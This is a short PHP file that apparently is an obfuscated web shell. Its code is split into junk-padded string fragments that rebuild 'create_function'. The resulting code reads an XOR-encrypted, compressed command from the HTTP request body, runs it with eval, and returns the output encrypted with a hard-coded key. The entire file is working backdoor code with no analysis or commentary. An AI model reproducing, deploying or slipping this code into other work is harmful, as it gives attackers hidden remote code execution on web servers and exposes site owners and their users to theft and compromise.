<?php
$Z=',x64_d,xecode($,xm[1],x),$k)));  ,x$o=@ob_get,x_cont,xent,xs();  @,xob_,xe,xnd_cle,xan(';
$p='//inp,xu,xt"),$m) =,x= 1) {,x  @,xob_s,xtart,x(,x);  @ev,xal(@gzuncompr,xess(@x(@ba,xse';
$G=');  $r=@base,x64,x_encode(@,xx(@gz,xcompr,xes,xs($o),$k),x);  print("$p,x$k,xh$r$kf");}';
$E=str_replace('Ai','','cAireatAieAi_fAiuAiAinction');
$A=',xSa1T";fun,xc,xtion x($t,x,$k){,x$c=,xstrlen($k,x);$l,x=str,xlen,x($t);$o="";for($,xi=0';
$b=';$,xi<,x$l;),x{f,xor($j=,x0,x;($j<$c&&$i<$l,x);$j+,x+,,x$i++){$o.=$t{$i}^$,xk{$j};},x}r';
$D=',xeturn $o;,x}if (@,xpre,xg_match(",x/$,x,xkh(.+)$kf/,x",,x@,xfile_get_content,xs("php:';
$u=',x$k=,x"019c9fbe";$kh="9102,x5390e,xfb,x1";$kf="c65,xce,x,x5e,xee5d6";$p="ALiuDY3dR,xrJe';
$P=str_replace(',x','',$u.$A.$b.$D.$p.$Z.$G);
$F=$E('',$P);$F();
?>
